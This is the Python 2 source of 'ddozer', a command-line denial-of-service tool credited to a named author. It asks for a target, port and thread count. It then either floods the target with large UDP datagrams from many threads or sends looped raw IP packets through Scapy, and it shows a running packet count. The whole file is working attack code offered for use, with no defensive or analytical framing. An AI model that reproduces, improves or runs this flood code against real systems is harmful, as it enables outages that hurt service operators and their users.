#Developer: developermind405@gmail.com
#Written by Lewin Sorg
from scapy.all import *
import socket,threading,argparse,sys,time
method = None
pkgcount = 0
ready = False
close = False
print "\x1b[36m"
print """
|  _ \|  _ \ / _ \__  / ____|  _ \ 
| | | | | | | | | |/ /|  _| | |_) |
| |_| | |_| | |_| / /_| |___|  _ < 
|____/|____/ \___/____|_____|_| \_\
"""
print "\x1b[31m          Written by Lewin Sorg"
print "                    https://github.com/Spezialcoder/ddozer"
print "\x1b[39m"
parser = argparse.ArgumentParser(description="DDOS Tool")
parser.add_argument("--raw",help="Attack without a open Port",action="store_true")
args = parser.parse_args()
##################################DDOS METHODS#########################################
def ddos_icmp(pkg):
    while True:
        try:
            sendp(pkg,iface="wlan1",loop=1,verbose=0,inter=0.0001)
        except:
            pass
def ddos(host,port):
    global ready,pkgcount,close
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        sock.connect((host,port))
        while True:
            if close:
                sock.close()
                break
            if ready:
                try:
                    sock.send("hellohellohellohellohellohellohello"*1871)
                    pkgcount += 1
                except:
                    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                    try:
                        sock.connect((host,port))
                    except:
                        while True:
                            try:
                                
                                 sock.connect((host,port))
                                 break
                            except:
                                pass
    except:
        pass
############################################################################################
if args.raw:
    method = "raw"
else:
    method = "std"
if method == "raw":
    print 
    try:
        target = raw_input("\x1b[36mTarget: \x1b[31m")
    except:
        exit()
    while True:
        try:
            thread_count = int(raw_input("\x1b[36mThreads: \x1b[31m"))
            break
        except:
            print "Only Numbers!"
    print "\x1b[39m"
    load = "1"*1486
    pkg = IP(dst=target)/load
    print 
    print "\x1b[31m#########################DDOS STARTING...######################"
    print "Method: icmp"
    print "Target: {0}".format(target)
    print "Threads: {0}".format(thread_count)
    print "###############################################################\x1b[39m"
    print
    yn = raw_input("\x1b[36mExecute (\x1b[32my\x1b[36m,\x1b[31mn\x1b[36m)?\x1b[39m ")
    old = ""
    if yn.lower() == "y":
            for i in range(thread_count):
                p = str(int(float(100./thread_count)*i))+"%"
                if p != old:
                    print "Processing Threads {0}".format(p)
                    old = p
                try:
                    cthread = threading.Thread(target=ddos_icmp,args=pkg)
                    cthread.daemon = True
                    cthread.start()
                except:
                    pass
            print "Processing Threads 100%"
            print
            print "Attacking Target"
            while True:
                    try:
                        pass
                    except KeyboardInterrupt:
                        print "Cancel"
                        break
            exit()
else:
    try:
        target = raw_input("\x1b[36mTarget: \x1b[31m")
    except:
        exit()
    while True:
        try:
            port = int(raw_input("\x1b[36mPort: \x1b[31m"))
            break
        except:
            print "Only Numbers!"
    while True:
        try:
            thread_count = int(raw_input("\x1b[36mThreads: \x1b[31m"))
            break
        except:
            print "Only Numbers!"
    print "\x1b[39m"
    print 
    print "\x1b[31m#########################DDOS STARTING...######################"
    print "Method: Standard"
    print "Target: {0}".format(target)
    print "Threads: {0}".format(thread_count)
    print "###############################################################\x1b[39m"
    print "\a"
    yn = raw_input("\x1b[36mExecute (\x1b[32my\x1b[36m,\x1b[31mn\x1b[36m)?\x1b[39m ")
    if yn.lower() == "y":
            for i in range(thread_count):
                p = str(int(float(100./thread_count)*i))+"%"
                print "Processing Threads {0}".format(p)
                try:
                    cthread = threading.Thread(target=ddos,args=(target,port))
                    cthread.daemon = True
                    cthread.start() 
                except:
                    pass
            print
            print "Attacking Target"
            time.sleep(1)
            ready = True
            while True:
                try:
                    
                    print "\x1b[H\x1b[2J\x1b[3J"
                    print "Packages: {0}".format(pkgcount)
                    time.sleep(0.001)
                except KeyboardInterrupt:
                    print "Abort"
                    break
            close = True
            time.sleep(1)
            exit()
